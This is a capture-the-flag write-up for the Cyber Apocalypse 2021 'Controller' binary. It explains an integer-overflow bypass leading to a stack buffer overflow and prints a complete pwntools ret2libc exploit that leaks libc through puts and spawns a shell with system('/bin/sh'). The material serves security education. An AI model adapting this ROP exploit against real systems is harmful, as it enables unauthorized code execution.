# Cyber Apocalypse 2021 - Controller

## Analysis

As usual, I first analyzed the binary with Ghidra to see what the application is doing and how to exploit it.

```c
void calculator(void)

{
  char local_28 [28];
  int local_c;

  local_c = calc();
  if (local_c == 0xff3a) {
    printstr("Something odd happened!\nDo you want to report the problem?\n> ");
    __isoc99_scanf(&DAT_004013e6,local_28);
    if ((local_28[0] == 'y') || (local_28[0] == 'Y')) {
      printstr("Problem reported!\n");
    }
    else {
      printstr("Problem ingored\n");
    }
  }
  else {
    calculator();
  }
  return;
}
```

### Integer overflow

I noticed a `calculator()` function that takes input with `scanf()` which we can use to overflow the stack buffer. However to access the input, `calc()` needs to return `0xff3a == 65338`.

Let's examine `calc()` to see how we can return 65338.

```c
uint calc(void)

{
  ushort uVar1;
  float fVar2;
  uint local_18;
  uint local_14;
  int local_10;
  uint local_c;

  printstr("Insert the amount of 2 different types of recources: ");
  __isoc99_scanf("%d %d",&local_14,&local_18);
  local_10 = menu();
  if ((0x45 < (int)local_14) || (0x45 < (int)local_18)) {
    printstr("We cannot use these many resources at once!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x69);
  }
  if (local_10 == 2) {
    local_c = sub(local_14,local_18,local_18);
    printf("%d - %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
    return local_c;
  }
  if (local_10 < 3) {
    if (local_10 == 1) {
      local_c = add(local_14,local_18,local_18);
      printf("%d + %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
  }
  else {
    if (local_10 == 3) {
      uVar1 = mult(local_14,local_18,local_18);
      local_c = (uint)uVar1;
      printf("%d * %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
    if (local_10 == 4) {
      fVar2 = (float)divi(local_14,local_18,local_18);
      local_c = (uint)(long)fVar2;
      printf("%d / %d = %d\n",(ulong)local_14,(ulong)local_18,(long)fVar2 & 0xffffffff);
      return local_c;
    }
  }
  printstr("Invalid operation, exiting..\n");
  return local_c;
}
```

`Calc()` looks interesting. It takes 2 integers and when multiplied, the result is stored in unsigned integer.

The goal is to get 65338 using basic arithmetic operations, but our numbers cannot be bigger than 69. Because the result is stored in unsigned integer it is possible to do an integer overflow.

By multiplying -198 * 1, `calc()` returns correct result and we now can overflow the buffer using `scanf()`

`-198 * 1 = 65338`

## Exploitation

### Deciding the attack method
Checking out what security features are included in the binary:
```bash
[*] 'controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX is enabled so we cannot execute shellcode. No PIE and No canary allows us to do a basic ROP chain. Because libc.so.6 file was given with the binary, I assumed that this requires the classic Return-to-libc attack.

### Flow of the attack

#### 1. Finding out the right offset
When analyzing the code with Ghidra, we see that `char local_28 [28];` after 28 characters we access the stack.

However I like to check the right amount in GEF:
```
[+] Found at offset 40 (big-endian search)
```
So the right offset is 40 but our payload contains `/bin/sh` string which is 8 characters so we set the offset to 32

#### 2. Leak libc address using puts
Controller binary contains a `puts` function which we can use to find out libc address. First we leak the `puts` address and calculate the libc base address with it.

We need to continue the flow of the program, so let's call main function at the end of the payload.

```python
#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")

#STAGE 1.
log.success("Beginning STAGE 1.")
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_main = elf.symbols["main"]
log.info(f"got_puts @ {hex(got_puts)}")
log.info(f"plt_puts @ {hex(plt_puts)}")
log.info(f"plt_main @ {hex(plt_main)}")

payload = junk
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(plt_main)

libc.address = leak - libc.symbols["puts"]
```

#### 3. Create the payload to achieve a shell
The final payload is super basic.

Basically we just call return twice (for some reason remote needed second return), then pop RDI and enter the `/bin/sh` into the RDI register. After that we can just call a system function and we get a shell.

```python
#STAGE 2.
print()
log.success("Beginning STAGE 2.")
bin_sh = next(libc.search(b"/bin/sh")) # Libc /bin/sh address
system = libc.symbols["system"] # libc system address
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"system @ {hex(system)}")

#Crafting the final payload
payload = junk
payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

#Sending the payload
log.success("Sending the payload")
send(payload)
r.interactive()
```

### Final exploit
Overall this was a fun challenge and I once again learned something new about ROP attacks.

Here is my final exploit:

```python
from pwn import *

#Settings
filename = "controller"
remote = False
junk = b"A"*32

def send(payload):
    r.sendlineafter(" the amount of 2 different types of recources:", "-198 1 3")
    r.recvuntil("Do you want to report the problem?")
    r.sendlineafter(">", payload)
    r.recvuntil(" Problem ingored\n")

def start(elf, ssh=False):
    if remote:
        if ssh:
            s = ssh(host="", user="", password="")
            return [s.process(), ELF("libc.so.6")]
        else:
            return [remote("", 1337), ELF("libc.so.6")]
    else:
        return [elf.process(), ELF('/lib/x86_64-linux-gnu/libc.so.6')]


#Start the processes.
elf = ELF(filename)
r = start(elf)[0]
libc = start(elf)[1]
rop = ROP(elf)

#Base gadgets
ret_addr = (rop.find_gadget(['ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] # pop rdi; ret
log.info(f"pop rdi @ {hex(pop_rdi)}")
log.info(f"return address @ {hex(ret_addr)}")


#STAGE 1.
log.success("Beginning STAGE 1.")
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
plt_main = elf.symbols["main"]
log.info(f"got_puts @ {hex(got_puts)}")
log.info(f"plt_puts @ {hex(plt_puts)}")
log.info(f"plt_main @ {hex(plt_main)}")

payload = junk
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(plt_main)

send(payload)

leak = u64(r.recvline()[:8].strip().ljust(8, b"\x00"))
log.info(f"leaked puts address @ {hex(leak)}")
libc.address = leak - libc.symbols["puts"]
log.info(f"LIBC Base address @ {hex(libc.address)}")

#STAGE 2.
print()
log.success("Beginning STAGE 2.")
bin_sh = next(libc.search(b"/bin/sh")) # Libc /bin/sh address
system = libc.symbols["system"] # libc system address
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"system @ {hex(system)}")

#Crafting the final payload
payload = junk
payload += p64(ret_addr)
payload += p64(ret_addr)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

#Sending the payload
log.success("Sending the payload")
send(payload)
r.interactive()
```
